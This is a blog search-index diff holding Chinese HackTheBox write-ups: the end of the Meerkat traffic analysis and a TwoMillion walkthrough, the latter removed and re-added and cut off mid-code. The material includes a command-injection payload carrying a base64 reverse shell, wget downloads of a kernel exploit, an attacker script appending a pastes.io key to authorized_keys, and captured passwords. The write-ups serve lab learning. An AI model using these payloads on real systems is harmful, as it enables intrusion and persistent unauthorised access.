+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot; &amp;&amp; http contains &quot;seb.broom%40forela.co.uk&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找到用户名<code>seb.broom%40forela.co.uk</code>存在四次重复密码</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418200345629.png"></p>
+<p>整理一下<code>59-4+1</code>总共56次碰撞</p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>哪个用户名和密码组合成功？</strong></p>
+<p>我们查找一下响应包也就是用到<code>ip.src</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==172.31.6.44</span><br></pre></td></tr></table></figure>
+
+<p>注意到响应为204说明爆破成功，追踪下tcp</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418200905116.png"></p>
+<p>得到用户名和密码（答案注意url编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>如果有，攻击者使用了哪个文本共享网站？</strong></p>
+<p>使用网站的话那么请求包中应该有<code>http</code>字符（也可以筛选字符串<code>cmd</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;http&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>找到为<code>pastes.io</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418201250245.png"></p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>请提供攻击者用于在我们的主机上获得持久性的公钥的文件名。</strong></p>
+<p>我们已经知道黑客用wget去下载该文件，我们打开kali去下载看看</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418202654452.png"></p>
+<p>不给连接这就怪了，文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>所以文件名为<code>hffgra4unv</code></p>
+<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>您能否确认攻击者修改的文件以获得持久性？</strong></p>
+<p>通过前一道题可以知道用curl命令将文件写到<code>/home/ubuntu/.ssh/authorized_keys</code></p>
+<p>所以能知道攻击者修改了文件</p>
+<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>您能确认这种持久性机制的 MITRE 技术 ID 吗？</strong></p>
+<p>搜索引擎搜索<code>MITRE authorized_keys</code> ，成功找到id为<code>T1098.004</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418203318734.png"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1794,114 +2055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>TwoMillion-HackTheBox</title>
-    <url>/article/TwoMillion-HackTheBox.html</url>
-    <content><![CDATA[<p>OverlayFS 内核漏洞 （CVE-2023-0386）</p>
-<span id="more"></span>
-
-<p><strong>信息搜集</strong></p>
-<p>nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.221</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http        nginx</span><br><span class="line">3851/tcp filtered spectraport</span><br></pre></td></tr></table></figure>
-
-<p>访问下80端口发现跳转到<code>2million.htb</code>，添加下<code>/etc/hosts</code></p>
-<p>然后发现存在登录界面</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416202314077.png"></p>
-<p>我们扫一下目录</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416202447836.png"></p>
-<p>我们依次去访问看看</p>
-<ul>
-<li>&#x2F;api和&#x2F;api&#x2F;v1路由均不可访问</li>
-<li>&#x2F;register路由可以注册用户，不过需要<code>Invite code</code>且不可输入</li>
-<li>主页的join功能可以访问&#x2F;invite路由，并且存在js源码</li>
-</ul>
-<p>访问复制下来然后调整一下 <a href="https://beautifier.io/">代码美化</a></p>
-<p>注意勾上<code>打包器（packers）和混淆器（obfuscators）的功能</code></p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416210743024.png"></p>
-<p>成功得到源码（也可以将该函数丢到控制台执行）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &#x27;/api/v1/invite/verify&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &#x27;/api/v1/invite/how/to/generate&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>两个路由分别是用来验证邀请码和生成邀请码</p>
-<p>我们先用curl命令发送下POST请求</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST http://2million.htb/api/v1/invite/how/to/generate</span><br></pre></td></tr></table></figure>
-
-<p>得到回显，提示要ROT13解密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;data&quot;: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;ROT13&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hint&quot;: &quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>找一个ROT13在线解码，得到信息要去<code>/api/v1/invite/generate</code>发送POST请求即可得到邀请码</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416211753024.png"></p>
-<p>发送POST请求，得到邀请码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;code&quot;: &quot;QldKWDMtSDlQMVAtT1k0NVQtWks5V0I=&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;encoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里很明显是base64加密的，解码即可</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416212244668.png"></p>
-<p>bp抓包添加上邀请码</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416212711323.png"></p>
-<p>出现302说明注册成功，我们直接登录</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416213026087.png"></p>
-<p>当我们再次访问之前的<code>/api/v1</code></p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416213222821.png"></p>
-<p>我们注意到<code>/api/v1/admin/settings/update</code>路由，用PUT请求可以更新user的设置</p>
-<p>bp抓包试试，回显<code>Invalid content type</code>，应该是要添加Content-Type解析json数据</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416213757982.png"></p>
-<p>添加Content-Type头之后提示缺少email参数。由于路由是admin的，大概率是要admin的email</p>
-<p>我们继续查看<code>/api/v1/admin/vpn/generate</code>路由，POST请求发现回显<code>Unauthorized</code>，我们只能回到刚刚的update路由下再看看，我们添加上email参数值为我们注册的邮箱，回显如下</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416215119320.png"></p>
-<p>得到信息<code>is_admin</code>参数应该是用来判断是否为admin用户，我们添加上并改为1后发包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;email&quot;:&quot;test@qq.com&quot;,</span><br><span class="line">	&quot;is_admin&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后再次访问<code>/api/v1/admin/vpn/generate</code>，回显缺少username参数</p>
-<p>添加上成功回显</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416215424687.png"></p>
-<p>这里参考wp说是存在命令注入漏洞，通过sleep函数检测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;sleep 2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny8xMDI4IDA+JjE=|base64 -d|bash&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>成功反弹shell</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416222115130.png"></p>
-<p>我们不妨看看源码是如何注入的，查看下<code>/controllers/VPNController.php</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">admin_vpn</span>(<span class="params"><span class="variable">$router</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] !== <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid content type.&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$json</span>-&gt;username) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$json</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">regenerate_user_vpn</span>(<span class="variable">$router</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/usr/bin/cat /var/www/html/VPN/user/<span class="subst">$username</span>.ovpn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$output</span>) ? <span class="title function_ invoke__">implode</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>, <span class="variable">$output</span>) : <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>我们注意到<code>$username</code>传递给<code>regenerate_user_vpn</code>函数，并且只是要求username为json格式</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">regenerate_user_vpn</span>(<span class="params"><span class="variable">$router</span>, <span class="variable">$user</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$user</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$user</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">remove_special_chars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">           <span class="variable">$fileName</span> = <span class="variable">$username</span>. <span class="string">&quot;.ovpn&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$username</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">download_vpn</span>(<span class="variable">$fileName</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>那么在传递到<code>regenerate_user_vpn</code>函数后很明显是可以命令拼接，利用<code>;</code>来实现命令注入</p>
-<p>拼接结果如下，执行id命令并注释掉后面代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;/bin/bash /var/www/html/VPN/gen.sh test;id#&quot;, $output, $return_var);</span><br></pre></td></tr></table></figure>
-
-<p>回到题目，我们ls一下发现存在<code>.env</code>文件，应该存在个人信息</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416222758989.png"></p>
-<p>得到admin用户的密码，那么我们直接连接本地数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u admin -p -h localhost</span><br></pre></td></tr></table></figure>
-
-<p>得到其他用户的个人信息</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416224613203.png"></p>
-<p>不过没什么用，因为我们可以直接ssh连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh admin@10.10.11.221</span><br><span class="line">SuperDuperPass123</span><br></pre></td></tr></table></figure>
-
-<p>连接上后，先在<code>/home/admin/</code>拿到user的flag</p>
-<p>然后参考wp说是有hint，在<code>/var/mail/admin</code></p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416233525168.png"></p>
-<p>经过搜索找到OverlayFS 内核漏洞 （CVE-2023-0386）</p>
-<p><a href="https://github.com/Fanxiaoyao66/CVE-2023-0386">exp链接</a></p>
-<p>我们先开启http服务，在靶机用wget命令复制到<code>/tmp</code>目录下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.57/exp.sh</span><br><span class="line">wget http://10.10.14.57/fuse.c</span><br></pre></td></tr></table></figure>
-
-<p>然后执行<code>/bin/bash exp.sh</code>，成功提权（该目录还有其他师傅传的exp）</p>
-<p><img src="/article/TwoMillion-HackTheBox/image-20240416234624574.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>UTF-8 Overlong Encoding导致的安全问题</title>
     <url>/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html</url>
     <content><![CDATA[<p>GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf</p>
@@ -2220,6 +2373,114 @@
       </categories>
   </entry>
   <entry>
+    <title>TwoMillion-HackTheBox</title>
+    <url>/article/TwoMillion-HackTheBox.html</url>
+    <content><![CDATA[<p>OverlayFS 内核漏洞 （CVE-2023-0386）</p>
+<span id="more"></span>
+
+<p><strong>信息搜集</strong></p>
+<p>nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.221</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http        nginx</span><br><span class="line">3851/tcp filtered spectraport</span><br></pre></td></tr></table></figure>
+
+<p>访问下80端口发现跳转到<code>2million.htb</code>，添加下<code>/etc/hosts</code></p>
+<p>然后发现存在登录界面</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416202314077.png"></p>
+<p>我们扫一下目录</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416202447836.png"></p>
+<p>我们依次去访问看看</p>
+<ul>
+<li>&#x2F;api和&#x2F;api&#x2F;v1路由均不可访问</li>
+<li>&#x2F;register路由可以注册用户，不过需要<code>Invite code</code>且不可输入</li>
+<li>主页的join功能可以访问&#x2F;invite路由，并且存在js源码</li>
+</ul>
+<p>访问复制下来然后调整一下 <a href="https://beautifier.io/">代码美化</a></p>
+<p>注意勾上<code>打包器（packers）和混淆器（obfuscators）的功能</code></p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416210743024.png"></p>
+<p>成功得到源码（也可以将该函数丢到控制台执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &#x27;/api/v1/invite/verify&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &#x27;/api/v1/invite/how/to/generate&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个路由分别是用来验证邀请码和生成邀请码</p>
+<p>我们先用curl命令发送下POST请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST http://2million.htb/api/v1/invite/how/to/generate</span><br></pre></td></tr></table></figure>
+
+<p>得到回显，提示要ROT13解密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;data&quot;: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;ROT13&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hint&quot;: &quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找一个ROT13在线解码，得到信息要去<code>/api/v1/invite/generate</code>发送POST请求即可得到邀请码</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416211753024.png"></p>
+<p>发送POST请求，得到邀请码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;code&quot;: &quot;QldKWDMtSDlQMVAtT1k0NVQtWks5V0I=&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;encoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里很明显是base64加密的，解码即可</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416212244668.png"></p>
+<p>bp抓包添加上邀请码</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416212711323.png"></p>
+<p>出现302说明注册成功，我们直接登录</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416213026087.png"></p>
+<p>当我们再次访问之前的<code>/api/v1</code></p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416213222821.png"></p>
+<p>我们注意到<code>/api/v1/admin/settings/update</code>路由，用PUT请求可以更新user的设置</p>
+<p>bp抓包试试，回显<code>Invalid content type</code>，应该是要添加Content-Type解析json数据</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416213757982.png"></p>
+<p>添加Content-Type头之后提示缺少email参数。由于路由是admin的，大概率是要admin的email</p>
+<p>我们继续查看<code>/api/v1/admin/vpn/generate</code>路由，POST请求发现回显<code>Unauthorized</code>，我们只能回到刚刚的update路由下再看看，我们添加上email参数值为我们注册的邮箱，回显如下</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416215119320.png"></p>
+<p>得到信息<code>is_admin</code>参数应该是用来判断是否为admin用户，我们添加上并改为1后发包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;email&quot;:&quot;test@qq.com&quot;,</span><br><span class="line">	&quot;is_admin&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再次访问<code>/api/v1/admin/vpn/generate</code>，回显缺少username参数</p>
+<p>添加上成功回显</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416215424687.png"></p>
+<p>这里参考wp说是存在命令注入漏洞，通过sleep函数检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;sleep 2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny8xMDI4IDA+JjE=|base64 -d|bash&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416222115130.png"></p>
+<p>我们不妨看看源码是如何注入的，查看下<code>/controllers/VPNController.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">admin_vpn</span>(<span class="params"><span class="variable">$router</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] !== <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid content type.&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span 